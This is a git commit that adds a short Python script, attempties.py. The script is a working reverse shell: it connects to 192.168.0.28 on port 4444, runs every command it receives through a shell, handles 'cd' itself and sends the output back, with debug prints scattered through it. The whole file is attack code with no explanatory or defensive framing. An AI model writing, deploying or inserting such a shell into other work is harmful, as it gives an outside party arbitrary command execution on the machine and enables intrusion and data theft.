1f227c22428c16ac1eaf0ba4557ffbb11e7e78d6
zaferkacmaz <44503428+zaferkacmaz@users.noreply.github.com>
2019-04-07 02:55:30 +0300

    Add files via upload

---
+++ attempties.py
@@ -0,0 +1,26 @@
+import socket
+import subprocess
+import os
+
+
+host = "192.168.0.28"
+port = 4444
+
+print("Start")
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+print("second")
+s.connect((host,port))
+print("third")
+while True:
+     print("while\n")
+     data = s.recv(20480)
+     if data[:2].decode("utf-8") == 'cd':
+          os.chdir(data[3:].decode("utf-8"))
+     if len(data) > 0:
+          cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout = subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
+          output_byte = cmd.stdout.read()+cmd.stderr.read()
+          output_string = str(output_byte,"utf-8")
+          currentWD = os.getcwd()+">"
+          s.send(str.encode(output_string+currentWD))
+
+          print(output_string)
